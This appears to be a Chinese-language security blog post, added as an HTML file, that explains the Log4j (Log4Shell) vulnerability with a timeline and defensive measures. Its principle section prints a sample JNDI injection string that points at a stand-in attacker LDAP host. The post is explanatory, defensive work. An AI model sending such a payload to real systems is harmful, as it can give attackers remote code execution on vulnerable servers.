@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>从 Log4j 漏洞看供应链安全 - 信息安全实验室</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<div class="scanline"></div>
+<div class="container">
+
+<div class="hero">
+  <h1>// BLOG : 信息安全实验室</h1>
+  <div class="subtitle">RHODES ISLAND <span>://</span> SECURITY <span>//</span> RESEARCH <span>//</span> EXPLOIT <span>//</span> DEFENSE</div>
+  <div class="tags-bar">
+    <a href="../index.html" class="tag tag-cyan">#首页</a>
+    <a href="#" class="tag tag-cyan">#漏洞分析</a>
+    <a href="#" class="tag tag-blue">#供应链安全</a>
+    <a href="#" class="tag tag-orange">#CVE</a>
+  </div>
+  <div class="tagline">&gt; LOADING - 100% <span class="cursor">▌</span></div>
+</div>
+
+<a href="../index.html" class="back-link">[ &larr; ] BACK TO HOME</a>
+
+<div class="post">
+  <div class="post-date">2026 // 05 / 15</div>
+  <div class="post-title">从 Log4j 漏洞看供应链安全</div>
+  <div class="post-tags">
+    <span class="post-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">漏洞分析</span>
+    <span class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">供应链安全</span>
+    <span class="post-tag" style="background:#ff6b3522;color:#ff6b35;border:1px solid #ff6b3544">CVE</span>
+  </div>
+
+  <div class="post-content" style="display:block;border:none;padding:0;margin:0;">
+
+<h4>漏洞时间线</h4>
+<table>
+  <tr><th>时间</th><th>事件</th></tr>
+  <tr><td>2021-11-24</td><td>陈师傅在阿里云安全团队发现漏洞并提交</td></tr>
+  <tr><td>2021-12-09</td><td>漏洞细节公开，引发全球应急响应</td></tr>
+  <tr><td>2021-12-10</td><td>CVSS 评分 10.0 (最高严重等级)</td></tr>
+  <tr><td>2021-12-14</td><td>Apache 发布 Log4j 2.15.0 修复版</td></tr>
+  <tr><td>至今</td><td>持续出现绕过补丁的变种 (2.16.0 → 2.17.0)</td></tr>
+</table>
+
+<h4>漏洞原理</h4>
+<pre><code>${jndi:ldap://attacker.com/exploit}
+  ↑                           ↑
+JNDI 查询                 恶意 LDAP 服务器
+   → 返回恶意 Java 类
+   → 目标服务器执行
+   → 攻击者获得 RCE</code></pre>
+
+<h4>防御措施</h4>
+<ol>
+  <li><strong>升级 Log4j 至 2.17.0+</strong></li>
+  <li>设置 JVM 参数: <code>-Dlog4j2.formatMsgNoLookups=true</code></li>
+  <li>使用 WAF 规则拦截 JNDI 注入 Payload</li>
+  <li>建立 SBOM (软件物料清单) 管理供应链风险</li>
+</ol>
+
+<blockquote>这个漏洞教会我们：<strong>任何一个开源组件都可能成为整个系统的短板</strong>。</blockquote>
+
+  </div>
+</div>
+
+<div class="footer">
+  <div class="brand">RHODES ISLAND <span>://</span> SECURITY LAB <span>//</span> BLOG</div>
+  <div class="motto">&gt; 保持好奇 · 保持怀疑 · 保持学习</div>
+  <div class="links">
+    <a href="https://github.com/himobrine/wiki">GitHub</a>
+    <a href="../index.html">Home</a>
+  </div>
+  <div class="copy">(c) 2026 // SECURITY BLOG</div>
+</div>
+
+</div>
+</body>
+</html>
